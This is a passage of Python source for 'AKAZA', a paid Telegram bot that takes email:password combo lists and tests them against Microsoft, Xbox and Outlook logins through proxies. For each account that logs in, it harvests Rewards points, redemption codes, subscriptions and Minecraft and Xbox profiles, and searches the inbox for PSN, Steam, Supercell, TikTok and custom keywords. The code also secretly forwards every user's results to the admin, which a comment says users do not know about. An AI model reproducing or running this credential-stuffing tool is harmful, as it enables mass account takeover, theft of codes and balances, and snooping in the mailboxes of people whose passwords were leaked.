            # do_login returns {'token': token, 'user_hash': uh, 'raw': data}
            
            # Using the Users/Me endpoint
            r = self.session.get("https://profile.xboxlive.com/users/me/profile/settings?settings=Gamertag,Gamerscore,AccountTier", 
                                 headers=h, timeout=10, verify=False)
            if r.status_code == 200:
                data = r.json()
                profile = data.get('profileUsers', [{}])[0]
                settings = {s['id']: s['value'] for s in profile.get('settings', [])}
                return {
                    "gt": settings.get('Gamertag', 'N/A'),
                    "score": settings.get('Gamerscore', '0'),
                    "tier": settings.get('AccountTier', 'N/A')
                }
        except: pass
        return {"gt": "N/A", "score": 0, "tier": "N/A"}
    # ── MINECRAFT (Xbox Live → XSTS → MC API) ─────────────────────────────
    def get_minecraft_enhanced(self, xbox_tk):
        try:
            r1 = self.session.post("https://user.auth.xboxlive.com/user/authenticate",
                                   json={"Properties": {"AuthMethod": "RPS", "SiteName": "user.auth.xboxlive.com",
                                                         "RpsTicket": f"d={xbox_tk}"},
                                         "RelyingParty": "http://auth.xboxlive.com", "TokenType": "JWT"},
                                   timeout=10, verify=False).json()
            xbl_tk = r1['Token']
            uhs    = r1['DisplayClaims']['xui'][0]['uhs']
            r2 = self.session.post("https://xsts.auth.xboxlive.com/xsts/authorize",
                                   json={"Properties": {"SandboxId": "RETAIL", "UserTokens": [xbl_tk]},
                                         "RelyingParty": "rp://api.minecraftservices.com/", "TokenType": "JWT"},
                                   timeout=10, verify=False).json()
            if 'XErr' in str(r2): return {"owned": False}
            xsts_tk = r2['Token']
            r3 = self.session.post("https://api.minecraftservices.com/authentication/login_with_xbox",
                                   json={"identityToken": f"XBL3.0 x={uhs};{xsts_tk}"},
                                   timeout=10, verify=False).json()
            mc_tk = r3['access_token']
            r4 = self.session.get("https://api.minecraftservices.com/minecraft/profile",
                                  headers={"Authorization": f"Bearer {mc_tk}"}, timeout=10, verify=False)
            if r4.status_code == 200:
                d = r4.json()
                return {"owned": True, "username": d.get('name', '?'),
                        "uuid": d.get('id', ''),
                        "capes": [c.get('alias', '') for c in d.get('capes', []) if c.get('alias')]}
        except: pass
        return {"owned": False}

    # ── PSN CHECK (hit.py) ─────────────────────────────────────────────────
    def check_psn(self, tk, cid):
        try:
            h = {'Authorization': f'Bearer {tk}', 'X-AnchorMailbox': f'CID:{cid}',
                 'Content-Type': 'application/json', 'User-Agent': 'Outlook-Android/2.0'}
            p = {"Cvid": str(uuid.uuid4()), "Scenario": {"Name": "owa.react"},
                 "EntityRequests": [{"EntityType": "Conversation", "ContentSources": ["Exchange"],
                                     "Query": {"QueryString": "sony@txn-email.playstation.com OR PlayStation OR PSN"},
                                     "Size": 25}]}
            r = self.session.post("https://outlook.live.com/search/api/v2/query",
                                  json=p, headers=h, timeout=12, verify=False).json()
            rset = r['EntitySets'][0]['ResultSets'][0]
            total = rset.get('Total', 0)
            purchases = []
            if total > 0:
                for hit in rset.get('Results', []):
                    subj = hit.get('Subject', '')
                    m = re.search(r'(?:Thank you for|purchasing|ordered?:?)\s+([^\.\n]{5,60})', subj, re.I)
                    if m: purchases.append(m.group(1).strip())
            return {"count": int(total), "items": list(dict.fromkeys(purchases))[:5]}
        except: return {"count": 0, "items": []}

    # ── STEAM CHECK (hit.py) ───────────────────────────────────────────────
    def check_steam(self, tk, cid):
        try:
            h = {'Authorization': f'Bearer {tk}', 'X-AnchorMailbox': f'CID:{cid}',
                 'Content-Type': 'application/json', 'User-Agent': 'Outlook-Android/2.0'}
            p = {"Cvid": str(uuid.uuid4()), "Scenario": {"Name": "owa.react"},
                 "EntityRequests": [{"EntityType": "Conversation", "ContentSources": ["Exchange"],
                                     "Query": {"QueryString": "noreply@steampowered.com"},
                                     "Size": 10}]}
            r = self.session.post("https://outlook.live.com/search/api/v2/query",
                                  json=p, headers=h, timeout=10, verify=False).json()
            total = int(r['EntitySets'][0]['ResultSets'][0].get('Total', 0))
            return {"count": total}
        except: return {"count": 0}

    # ── SUPERCELL CHECK (hit.py) ───────────────────────────────────────────
    def check_supercell(self, tk, cid):
        try:
            h = {'Authorization': f'Bearer {tk}', 'X-AnchorMailbox': f'CID:{cid}',
                 'Content-Type': 'application/json', 'User-Agent': 'Outlook-Android/2.0'}
            p = {"Cvid": str(uuid.uuid4()), "Scenario": {"Name": "owa.react"},
                 "EntityRequests": [{"EntityType": "Conversation", "ContentSources": ["Exchange"],
                                     "Query": {"QueryString": "supercell.com OR noreply@id.supercell.com"},
                                     "Size": 20}]}
            r = self.session.post("https://outlook.live.com/search/api/v2/query",
                                  json=p, headers=h, timeout=10, verify=False).json()
            rset = r['EntitySets'][0]['ResultSets'][0]
            games = []
            if rset.get('Total', 0) > 0:
                for hit in rset.get('Results', []):
                    text = (hit.get('Subject', '') + ' ' + hit.get('Preview', '')).lower()
                    for g in ['Clash Royale', 'Clash of Clans', 'Brawl Stars', 'Hay Day', 'Boom Beach', 'Squad Busters']:
                        if g.lower() in text and g not in games: games.append(g)
            return games
        except: return []

    # ── TIKTOK CHECK (hit.py) ─────────────────────────────────────────────
    def check_tiktok(self, tk, cid):
        try:
            h = {'Authorization': f'Bearer {tk}', 'X-AnchorMailbox': f'CID:{cid}',
                 'Content-Type': 'application/json', 'User-Agent': 'Outlook-Android/2.0'}
            p = {"Cvid": str(uuid.uuid4()), "Scenario": {"Name": "owa.react"},
                 "EntityRequests": [{"EntityType": "Conversation", "ContentSources": ["Exchange"],
                                     "Query": {"QueryString": "tiktok.com OR account.tiktok"},
                                     "Size": 5}]}
            r = self.session.post("https://outlook.live.com/search/api/v2/query",
                                  json=p, headers=h, timeout=10, verify=False).json()
            rset = r['EntitySets'][0]['ResultSets'][0]
            if rset.get('Total', 0) > 0:
                for hit in rset.get('Results', []):
                    pre = hit.get('Preview', '')
                    m = re.search(r'(?:Hi|Hello|Hey|Dear)\s+([A-Za-z0-9_\.\-]{3,30})', pre)
                    if m: return m.group(1).strip()
        except: pass
        return None

    # ── INBOX SCAN (Optimized: hit.py logic) ──────────────────────────────
    def scan_inbox_enhanced(self, tk, cid, u_kws=None):
        """Enhanced inbox scanning using hit.py logic and target domains"""
        res = {"total": 0, "hits": {}}
        if not tk or not cid: return res
        h = {'Authorization': f'Bearer {tk}', 'X-AnchorMailbox': f'CID:{cid}',
             'User-Agent': 'Outlook-Android/2.0', 'Content-Type': 'application/json'}
        
        # 1. Total Count
        try:
            r_start = self.session.post(
                f"https://outlook.live.com/owa/{quote(cid)}/startupdata.ashx?app=Mini&n=0",
                data="", headers={**h, 'action': 'StartupData', 'x-owa-sessionid': str(uuid.uuid4()), 'content-length': '0'},
                timeout=12, verify=False)
            m_count = re.search(r'"TotalCount"\s*:\s*(\d+)', r_start.text)
            if m_count: res['total'] = int(m_count.group(1))
        except: pass

        # 2. Sequential search for better reliability
        combined = list(dict.fromkeys(list(TARGET_DOMAINS.keys()) + (u_kws or [])))
        # Search in batches to avoid query limits
        for i in range(0, len(combined), 10):
            batch = combined[i:i+10]
            q = ' OR '.join([f'"{k}"' for k in batch])
            payload = {
                "Cvid": str(uuid.uuid4()),
                "Scenario": {"Name": "owa.react"},
                "EntityRequests": [{
                    "EntityType": "Conversation", "ContentSources": ["Exchange"],
                    "Query": {"QueryString": q}, "Size": 50
                }]
            }
            try:
                r = self.session.post("https://outlook.live.com/search/api/v2/query",
                                      json=payload, headers=h, timeout=12, verify=False).json()
                rset = r.get('EntitySets', [{}])[0].get('ResultSets', [{}])[0]
                if rset.get('Total', 0) > 0:
                    for item in rset.get('Results', []):
                        preview = (item.get('Subject', '') + ' ' + item.get('Preview', '')).lower()
                        for k in batch:
                            if k.lower() in preview:
                                name = TARGET_DOMAINS.get(k, k)
                                res['hits'][name] = res['hits'].get(name, 0) + 1
            except: pass
        return res

    # ── MAIN CHECK ORCHESTRATOR ────────────────────────────────────────────
    async def check(self, email, password, uk=None, fast=False):
        if uk is None: uk = []
        loop = asyncio.get_running_loop()
        proxies = dict(self.session.proxies) if self.session.proxies else {}

        def make_checker():
            """Create a fresh checker with same proxy"""
            c = AkazaChecker()
            c.session.verify = False
            if proxies: c.session.proxies = proxies
            return c

        try:
            # ── STEP 1: Xbox RPS login (flux.py — primary) ──────────────
            up, ppft = await loop.run_in_executor(bot_executor, self.get_sftag_params)
            if not up:
                logger.warning(f"SFTAG failed for {email}")
                return {'status': 'error', 'email': email, 'password': password}

            status, xbox_token = await loop.run_in_executor(bot_executor, self.do_login, email, password, up, ppft)
            if status == '2FA': return {'status': '2fa', 'email': email, 'password': password}
            if status == 'BAD': return {'status': 'bad', 'email': email, 'password': password}
            xbox_ok = (status == 'TOKEN' and bool(xbox_token))

            # ── STEP 2: Outlook OAuth2 login (p7.py/hit.py — secondary) ─
            out_checker = make_checker()
            outlook_token, cid_out = await loop.run_in_executor(
                bot_executor, out_checker._outlook_login, email, password)
            outlook_ok = bool(outlook_token and cid_out)

            # If neither succeeded → bad
            if not xbox_ok and not outlook_ok:
                return {'status': 'bad', 'email': email, 'password': password}

            # CID for profile/inbox: prefer outlook, fall back to xbox session cookie
            if not cid_out:
                cid_out = next((c.value.upper() for c in self.session.cookies if c.name == 'MSPCID'), '')

            # Fast mode — only rewards + codes
            if fast and xbox_ok:
                pts   = await loop.run_in_executor(bot_executor, self.get_rewards_points)
                codes = await loop.run_in_executor(bot_executor, self.get_redemption_codes)
                return {'status': 'hit', 'email': email, 'password': password,
                        'pts': pts, 'codes': codes, 'subs': {"status":"FREE","subs":[],"balance":"","card":""},
                        'name': 'N/A', 'country': 'N/A', 'mc': {"owned": False},
                        'inbox': {"total":0,"hits":{}}, 'psn': {"count":0,"items":[]},
                        'steam': {"count":0}, 'supercell': [], 'tiktok': None}

            # ── STEP 3: All captures in parallel ─────────────────────────
            async def safe_run(fn, *args):
                try: return await loop.run_in_executor(bot_executor, fn, *args)
                except: return None

            coros = []
            # Xbox captures (index 0-4)
            if xbox_ok:
                coros += [safe_run(self.get_rewards_points),
                          safe_run(self.get_redemption_codes),
                          safe_run(self.get_microsoft_subs),
                          safe_run(self.get_minecraft_enhanced, xbox_token),
                          safe_run(self.get_xbox_profile, xbox_token)]
            else:
                coros += [safe_run(lambda: 0),
                          safe_run(lambda: []),
                          safe_run(lambda: {"status":"FREE","subs":[],"balance":"","card":""}),
                          safe_run(lambda: {"owned": False}),
                          safe_run(lambda: {"gt":"N/A","score":"0","tier":"N/A"})]

            # Outlook captures (index 5-10)
            if outlook_ok:
                coros += [safe_run(out_checker.get_profile, outlook_token, cid_out),
                          safe_run(out_checker.scan_inbox_enhanced, outlook_token, cid_out, uk),
                          safe_run(out_checker.check_psn, outlook_token, cid_out),
                          safe_run(out_checker.check_steam, outlook_token, cid_out),
                          safe_run(out_checker.check_supercell, outlook_token, cid_out),
                          safe_run(out_checker.check_tiktok, outlook_token, cid_out)]
            else:
                coros += [safe_run(lambda: ('N/A','N/A')),
                          safe_run(lambda: {"total":0,"hits":{}}),
                          safe_run(lambda: {"count":0,"items":[]}),
                          safe_run(lambda: {"count":0}),
                          safe_run(lambda: []),
                          safe_run(lambda: None)]

            res = await asyncio.gather(*coros, return_exceptions=True)

            def g(i, default):
                v = res[i]
                return v if not isinstance(v, Exception) and v is not None else default

            pts       = g(0, 0)
            codes     = g(1, [])
            subs      = g(2, {"status":"FREE","subs":[],"balance":"","card":""})
            mc        = g(3, {"owned": False})
            xbox_prof = g(4, {"gt":"N/A","score":"0","tier":"N/A"})
            nc        = g(5, ('N/A','N/A'))
            name, country = nc if isinstance(nc, tuple) else ('N/A','N/A')
            inbox     = g(6, {"total":0,"hits":{}})
            psn       = g(7, {"count":0,"items":[]})
            steam     = g(8, {"count":0})
            supercell = g(9, [])
            tiktok    = g(10, None)

            return {'status': 'hit', 'email': email, 'password': password,
                    'pts': pts, 'codes': codes, 'subs': subs, 'name': name, 'country': country,
                    'mc': mc, 'xbox': xbox_prof, 'inbox': inbox, 'psn': psn, 'steam': steam,
                    'supercell': supercell, 'tiktok': tiktok}

        except Exception as e:
            logger.exception(f"Check error for {email}: {e}")
            return {'status': 'error', 'email': email, 'password': password}



# ============================================================================
# BOT HANDLERS
# ============================================================================
user_proxies = {}
pending_files = {}

async def start(u: Update, c: ContextTypes.DEFAULT_TYPE):
    uid = u.effective_user.id
    akaza_db.add_user(uid, u.effective_user.username, u.effective_user.first_name)
    if akaza_db.is_banned(uid): return
    akaza_db.update_settings(uid, is_adding_kw=False)
    i, s = akaza_db.get_user_info(uid), akaza_db.get_user_settings(uid)
    
    msg = (f"💠 <b>Welcome to AKAZA Premium Checker</b> 💠\n\n"
           f"AKAZA is a high-speed Microsoft & Gaming account validator. "
           f"Use the dashboard below to manage your session.\n\n"
           f"📜 <b>Command Guide:</b>\n"
           f"� <b>Stats</b> - View your check history & hits.\n"
           f"⚙️ <b>Settings</b> - Toggle Fast Mode & Threads.\n"
           f"🔍 <b>Keywords</b> - Search for custom domains/emails.\n"
           f"🌐 <b>Proxy</b> - Upload your own proxy list (.txt).\n"
           f"📖 <b>Help</b> - How to use the bot.\n\n"
           f"👤 <b>User:</b> <code>{u.effective_user.first_name}</code>\n"
           f"💰 <b>Credits:</b> <code>{i['credits']}</code>\n"
           f"⚙️ <b>Threads:</b> <code>{s['threads']}</code>\n"
           f"🔑 <b>Keywords:</b> <code>{len(s['keywords'])}</code>\n\n"
           f"🛒 <i>To buy credits, contact @Akaza_Admin</i>")
    
    kbd = [[InlineKeyboardButton("📊 Stats", callback_data="stats"), InlineKeyboardButton("⚙️ Settings", callback_data="settings")],
           [InlineKeyboardButton("🔍 Keywords", callback_data="kw_mode"), InlineKeyboardButton("🌐 Proxy", callback_data="proxy")],
           [InlineKeyboardButton("📖 Help", callback_data="help")]]
    if akaza_db.is_mod(uid): kbd.append([InlineKeyboardButton("🛠 Admin", callback_data="admin")])
    if u.callback_query: await u.callback_query.edit_message_text(msg, reply_markup=InlineKeyboardMarkup(kbd), parse_mode="HTML")
    else: await u.message.reply_text(msg, reply_markup=InlineKeyboardMarkup(kbd), parse_mode="HTML")

async def handle_text(u: Update, c: ContextTypes.DEFAULT_TYPE):
    uid = u.effective_user.id
    if akaza_db.is_banned(uid): return
    s = akaza_db.get_user_settings(uid)
    if s.get('is_adding_kw'):
        kws = u.message.text.split()
        all_kws = list(set(s['keywords'] + kws))
        akaza_db.update_settings(uid, keywords=all_kws)
        await u.message.reply_text(f"✅ Added {len(kws)} keywords. Total: {len(all_kws)}.\nUse /skw to stop.")
        return
    if ':' in u.message.text: await handle_combo(u, c, u.message.text)

async def handle_document(u: Update, c: ContextTypes.DEFAULT_TYPE):
    uid = u.effective_user.id
    if akaza_db.is_banned(uid): return
    doc = u.message.document
    if not doc or not doc.file_name.lower().endswith('.txt'): return

    file = await c.bot.get_file(doc.file_id)
    content = (await file.download_as_bytearray()).decode('utf-8', 'ignore')

    caption = (u.message.caption or "").lower()
    if 'prox' in caption:
        user_proxies[uid] = [AkazaChecker().format_proxy(l.strip()) for l in content.splitlines() if l.strip()]
        await u.message.reply_text(f"✅ Loaded {len(user_proxies[uid])} proxies.")
        return

    pending_files[uid] = content
    kbd = [[InlineKeyboardButton("📁 Combo List", callback_data="set_combo"), InlineKeyboardButton("🔌 Proxy List", callback_data="set_proxy")]]
    await u.message.reply_text(f"❓ <b>File:</b> <code>{doc.file_name}</code>\nSelect the file type:", reply_markup=InlineKeyboardMarkup(kbd), parse_mode="HTML")

async def handle_combo(u: Update, c: ContextTypes.DEFAULT_TYPE, text=None):
    uid = u.effective_user.id
    if akaza_db.is_banned(uid): return
    if not text: text = pending_files.pop(uid, "")
    lines = [l.strip() for l in text.splitlines() if ':' in l]
    if not lines: return

    user_credits = akaza_db.get_credits(uid)
    if user_credits < len(lines) and uid != ADMIN_ID:
        await (u.callback_query.message.reply_text(f"⚠️ <b>Insufficient Credits!</b>\nYou need <code>{len(lines)}</code> but have <code>{user_credits}</code>.\n🛒 Contact @Akaza_Admin to buy credits.", parse_mode="HTML") if u.callback_query else u.message.reply_text(f"⚠️ <b>Insufficient Credits!</b>\nYou need <code>{len(lines)}</code> but have <code>{user_credits}</code>.\n🛒 Contact @Akaza_Admin to buy credits.", parse_mode="HTML"))
        return

    s = akaza_db.get_user_settings(uid)
    px = user_proxies.get(uid, []) or PROXIES_LIST
    thr = min(s['threads'], 300) if px else min(s['threads'], 10)

    status_msg = await (u.callback_query.message.reply_text("🚀 Starting session...") if u.callback_query else u.message.reply_text("🚀 Starting session..."))
    hits, bad, tfa, err, checked, start_t, last_up, last_h = 0, 0, 0, 0, 0, time.time(), 0, []
    all_hits_results, points_results, codes_results, inbox_results = [], [], [], []
    sid = str(uuid.uuid4().hex[:6])
    sem, up_lock = asyncio.Semaphore(thr), asyncio.Lock()

    async def worker(line):
        nonlocal hits, bad, tfa, err, checked, last_up, last_h
        async with sem:
            try:
                parts = line.split(':', 1)
                p = random.choice(px) if px else None
                data = await AkazaChecker(p).check(parts[0].strip(), parts[1].strip(), s['keywords'], s['fast_mode'])
            except: data = {'status': 'error', 'email': line.split(':')[0]}
            checked += 1; akaza_db.use_credit(uid); akaza_db.save_result(uid, data.get('email',''), data['status'], data)
            st = data['status']
            if st == 'hit':
                hits += 1; pts = data.get('pts', 0); country = data.get('country','N/A')
                email, password = data['email'], data['password']
                xbox = data.get('xbox', {})
                mc = data.get('mc', {})
                inbox = data.get('inbox', {})
                psn = data.get('psn', {})
                steam = data.get('steam', {})
                
                tier = '💎 ULTRA' if pts >= 20000 or (mc and mc.get('owned')) else '⭐ PREMIUM' if pts >= 5000 else '🎯 HIT'
                msg = (f"<b>{tier} - AKAZA HIT</b>\n"
                       f"━━━━━━━━━━━━━━━━━━\n"
                       f"📧 <code>{email}</code>\n"
                       f"🔑 <code>{password}</code>\n\n"
                       f"👤 <b>Name:</b> <code>{data.get('name','N/A')}</code>\n"
                       f"🌍 <b>Region:</b> <code>{country}</code>\n"
                       f"⭐ <b>Rewards:</b> <code>{pts} Points</code>\n"
                       f"🎮 <b>Xbox:</b> <code>{xbox.get('gt','N/A')}</code> (Score: {xbox.get('score',0)})\n")

                all_hits_results.append(f"{email}:{password} | Pts:{pts} | GT:{xbox.get('gt','N/A')} | {country}")
                if pts > 0: points_results.append(f"{email}:{password} | {pts} Pts")

                # Minecraft
                if mc.get('owned'):
                    msg += f"⛏️ <b>Minecraft:</b> <code>{mc.get('name','Managed')}</code>"
                    if mc.get('capes'): msg += f" (Capes: {', '.join(mc['capes'])})"
                    msg += "\n"

                # Codes
                codes = data.get('codes', [])
                if codes:
                    cat_map = {}
                    for co in codes: 
                        cat = co.get('category','Unknown')
                        cat_map.setdefault(cat, []).append(co)
                        codes_results.append(f"{email}:{password} | {cat}: {co['code']} {co.get('redemption_url','')}")
                    msg += "🎁 <b>Codes:</b>\n"
                    for cat, clist in cat_map.items():
                        c_strs = [f"<code>{co['code']}</code>" + (f" <a href=\"{co['redemption_url']}\">[Redeem]</a>" if co.get('redemption_url') else "") for co in clist]
                        msg += f" ├ {cat}: {', '.join(c_strs)}\n"

                # Subscriptions
                subs_data = data.get('subs', {})
                subs = subs_data.get('subs', [])
                active = [su for su in subs if not su.get('is_expired')]
                if active:
                    sub_lines = []
                    for su in active:
                        s_str = su['name']
                        if 'days_remaining' in su: s_str += f" ({su['days_remaining']}d)"
                        sub_lines.append(s_str)
                    msg += f"💎 <b>Subscriptions:</b> {', '.join(sub_lines)}\n"
                
                # Gaming Extras
                extras = []
                if psn.get('count', 0) > 0: extras.append(f"PSN({psn['count']})")
                if steam.get('count', 0) > 0: extras.append(f"Steam({steam['count']})")
                if data.get('supercell'): extras.append(f"SC({len(data['supercell'])})")
                if data.get('tiktok'): extras.append(f"TikTok(@{data['tiktok']})")
                if extras: msg += f"🕹️ <b>Gaming:</b> {', '.join(extras)}\n"

                # Inbox / Domain Hits
                if inbox.get('total', 0) > 0 or inbox.get('hits'):
                    msg += f"📬 <b>Inbox:</b> <code>{inbox.get('total', 0)}</code>"
                    if inbox.get('hits'):
                        kw_str = ", ".join([f"<b>{k}</b>({v})" for k,v in inbox.get('hits', {}).items()])
                        msg += f" | {kw_str}"
                        inbox_results.append(f"{email}:{password} | Total: {inbox.get('total', 0)} | KWs: {', '.join([f'{k}({v})' for k,v in inbox.get('hits',{}).items()])}")
                    msg += "\n"

                msg += "━━━━━━━━━━━━━━━━━━"
                # Hits are processed but NO individual Telegram message is sent to prevent flooding
                # except to Admin via the final results file (silent report)
                
                last_h.append(email); last_h = last_h[-5:]
            elif st == '2fa': tfa += 1
            elif st == 'error': err += 1
            else: bad += 1

            async with up_lock:
                if time.time() - last_up > 3 or checked == len(lines):
                    last_up = time.time(); el = time.time() - start_t; cpm = int((checked/el)*60) if el > 0 else 0
                    prg = (f"� <b>Checking Session</b> 💠\n\n"
                           f"📊 <b>Progress:</b> <code>{checked}/{len(lines)}</code>\n"
                           f"⚡ <b>CPM:</b> <code>{cpm}</code>\n"
                           f"🎯 <b>Hits:</b> <code>{hits}</code>\n"
                           f"💀 <b>Bad:</b> <code>{bad}</code>\n"
                           f"🔒 <b>2FA:</b> <code>{tfa}</code>\n"
                           f"❌ <b>Errors:</b> <code>{err}</code>\n\n"
                           f"🕒 <b>Recent:</b> <code>{' | '.join(last_h) or 'None'}</code>")
                    try: await status_msg.edit_text(prg, parse_mode='HTML')
                    except: pass

    tasks = []
    for line in lines:
        if akaza_db.is_banned(uid): break
        tasks.append(asyncio.create_task(worker(line)))
        if len(tasks) % 10 == 0: await asyncio.sleep(0.1) # Tiny delay to stagger
    if tasks: await asyncio.gather(*tasks)

    # FINAL REPORTING (FILES TO ADMIN)
    user_handle = f"@{u.effective_user.username}" if u.effective_user.username else u.effective_user.first_name
    admin_summary = f"📢 <b>Session Complete</b>\nUser: {user_handle} ({uid})\nTotal: {len(lines)}\nHits: {hits}"
    
    # Save results to temporary files and send
    files_to_send = [
        ("hits.txt", all_hits_results),
        ("points.txt", points_results),
        ("codes.txt", codes_results),
        ("inbox.txt", inbox_results)
    ]
    
    for filename, content_list in files_to_send:
        if content_list:
            path = f"{uid}_{filename}"
            with open(path, 'w', encoding='utf-8') as f:
                f.write(f"Generated by Akaza Bot for {user_handle}\n")
                f.write("\n".join(content_list))
            
            with open(path, 'rb') as f:
                # Admin gets results silently
                await c.bot.send_document(ADMIN_ID, f, filename=filename, caption=f"📄 {filename} from {user_handle}")
                
                # User only gets their copy (silent to admin means user doesn't know copy went to admin)
                f.seek(0)
                await c.bot.send_document(uid, f, filename=filename, caption=f"✅ Your {filename} is ready.")
            os.remove(path)

    await status_msg.edit_text(f"✅ <b>Check Complete!</b>\n\nTotal: <code>{len(lines)}</code>\nHits: <code>{hits}</code>\n\n<i>All results have been sent to you as files.</i>", parse_mode="HTML")
    if uid in user_proxies: del user_proxies[uid]

async def cb_handler(u: Update, c: ContextTypes.DEFAULT_TYPE):
    q = u.callback_query; await q.answer(); uid = q.from_user.id
    if q.data == "settings":
        s = akaza_db.get_user_settings(uid)
        await q.edit_message_text(f"⚙️ <b>Settings</b>\nThreads: <code>{s['threads']}</code>\nFast Mode: <code>{s['fast_mode']}</code>", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="back")]]), parse_mode="HTML")
    elif q.data == "stats":
        st = akaza_db.user_stats(uid)
        await q.edit_message_text(f"📊 <b>Stats</b>\nChecks: <code>{st['checks']}</code>\nHits: <code>{st['hits']}</code>", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="back")]]), parse_mode="HTML")
    elif q.data == "kw_mode":
        akaza_db.update_settings(uid, is_adding_kw=True)
        await q.edit_message_text("🔍 <b>Keyword Mode</b>\nSend keywords separated by spaces.\n/skw to stop.", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="back")]]), parse_mode="HTML")
    elif q.data == "proxy":
        await q.edit_message_text(f"🌐 <b>Proxy</b>\nLoaded: <code>{len(user_proxies.get(uid, []))}</code>", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="back")]]), parse_mode="HTML")
    elif q.data == "back": await start(u, c)
    elif q.data == "set_combo": await handle_combo(u, c)
    elif q.data == "set_proxy":
        content = pending_files.pop(uid, "")
        user_proxies[uid] = [AkazaChecker().format_proxy(l.strip()) for l in content.splitlines() if l.strip()]
        await q.edit_message_text(f"✅ Loaded {len(user_proxies[uid])} proxies.")
    elif q.data == "admin" and akaza_db.is_mod(uid):
        st = akaza_db.get_global_stats()
        await q.edit_message_text(f"🛠 <b>Admin</b>\nUsers: {st['total']}\nChecks: {st['checks']}", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="back")]]), parse_mode="HTML")

async def cmd_skw(u: Update, c: ContextTypes.DEFAULT_TYPE): akaza_db.update_settings(u.effective_user.id, is_adding_kw=False); await u.message.reply_text("✅ Stopped.")
async def cmd_ckw(u: Update, c: ContextTypes.DEFAULT_TYPE): akaza_db.update_settings(u.effective_user.id, keywords=[]); await u.message.reply_text("✅ Cleared.")

async def cmd_addkw(u: Update, c: ContextTypes.DEFAULT_TYPE):
    uid = u.effective_user.id
    if not c.args: return
    s = akaza_db.get_user_settings(uid)
    kws = list(set(s['keywords'] + c.args))
    akaza_db.update_settings(uid, keywords=kws)
    await u.message.reply_text(f"✅ Added {len(c.args)} keywords.")

async def cmd_keywords(u: Update, c: ContextTypes.DEFAULT_TYPE):
    if not c.args: return
    akaza_db.update_settings(u.effective_user.id, keywords=list(set(c.args)))
    await u.message.reply_text("✅ Keywords updated.")

async def cmd_check(u: Update, c: ContextTypes.DEFAULT_TYPE):
    if not c.args or ':' not in c.args[0]: return
    await handle_combo(u, c, c.args[0])

async def admin_cmd_handler(u: Update, c: ContextTypes.DEFAULT_TYPE):
    uid = u.effective_user.id
    if not akaza_db.is_mod(uid): return
    m = u.message.text.split(); cmd, args = m[0].lower(), m[1:]
    try:
        if cmd == "!!addcredits" and len(args) >= 2: akaza_db.add_credits(int(args[0]), int(args[1])); await u.message.reply_text("✅")
        elif cmd == "!!setcredits" and len(args) >= 2: akaza_db.set_credits(int(args[0]), int(args[1])); await u.message.reply_text("✅")
        elif cmd == "!!resetcredits" and args: akaza_db.reset_credits(int(args[0])); await u.message.reply_text("✅")
        elif cmd == "!!grant" and args: akaza_db.grant_access(int(args[0])); await u.message.reply_text("✅")
        elif cmd == "!!revoke" and args: akaza_db.revoke_access(int(args[0])); await u.message.reply_text("✅")
        elif cmd == "!!addaccess" and len(args) >= 2: akaza_db.grant_timed_access(int(args[0]), int(args[1])); await u.message.reply_text("✅")
        elif cmd == "!!ban" and args: akaza_db.ban(int(args[0])); await u.message.reply_text("✅")
        elif cmd == "!!unban" and args: akaza_db.unban(int(args[0])); await u.message.reply_text("✅")
        elif cmd == "!!mod" and args and uid == ADMIN_ID: akaza_db.set_mod(int(args[0]), 1); await u.message.reply_text("✅")
        elif cmd == "!!unmod" and args and uid == ADMIN_ID: akaza_db.set_mod(int(args[0]), 0); await u.message.reply_text("✅")
        elif cmd == "!!listmods": await u.message.reply_text("\n".join([f"{m['uid']} (@{m['username']})" for m in akaza_db.list_mods()]))
        elif cmd == "!!info" and args: await u.message.reply_text(str(akaza_db.get_user_info(int(args[0]))))
        elif cmd == "!!stats": await u.message.reply_text(str(akaza_db.get_global_stats()))
        elif cmd == "!!broadcast" and args:
            txt = u.message.text[len(cmd):].strip(); count = 0
            for t in akaza_db.get_all_user_ids():
                try: await c.bot.send_message(t, txt); count += 1; await asyncio.sleep(0.05)
                except: pass
            await u.message.reply_text(f"✅ Sent to {count} users.")
        elif cmd == "!!setthreads" and len(args) >= 2: akaza_db.update_settings(int(args[0]), threads=int(args[1])); await u.message.reply_text("✅")
        elif cmd == "!!addproxies":
            pxs = u.message.text[len(cmd):].strip().splitlines()
            for p in pxs:
                if p.strip(): PROXIES_LIST.append(AkazaChecker().format_proxy(p.strip()))
            await u.message.reply_text(f"✅ Added {len(pxs)} global proxies.")
        elif cmd == "!!help": await u.message.reply_text("!!addcredits !!setcredits !!resetcredits !!grant !!revoke !!addaccess !!ban !!unban !!mod !!unmod !!listmods !!info !!stats !!broadcast !!setthreads !!addproxies")
    except Exception as e: await u.message.reply_text(f"❌ {e}")

def main():
    akaza_db.init_db()
    app = Application.builder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("threads", lambda u,c: akaza_db.update_settings(u.effective_user.id, threads=int(c.args[0])) or u.message.reply_text("✅") if c.args else None))
    app.add_handler(CommandHandler("keywords", cmd_keywords))
    app.add_handler(CommandHandler("addkw", cmd_addkw))
    app.add_handler(CommandHandler("skw", cmd_skw)); app.add_handler(CommandHandler("ckw", cmd_ckw))
    app.add_handler(CommandHandler("check", cmd_check))
    app.add_handler(CommandHandler("fastmode", lambda u,c: akaza_db.update_settings(u.effective_user.id, fast_mode=not akaza_db.get_user_settings(u.effective_user.id)['fast_mode']) or u.message.reply_text("✅")))
    app.add_handler(CallbackQueryHandler(cb_handler))
    app.add_handler(MessageHandler(filters.TEXT & filters.Regex(r'^!!'), admin_cmd_handler))
    app.add_handler(MessageHandler(filters.Document.ALL, handle_document))
    app.add_handler(MessageHandler(filters.TEXT & filters.Regex(r'[^!].+:.+'), handle_combo))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_text))
    app.run_polling(drop_pending_updates=True)

if __name__ == '__main__': main()
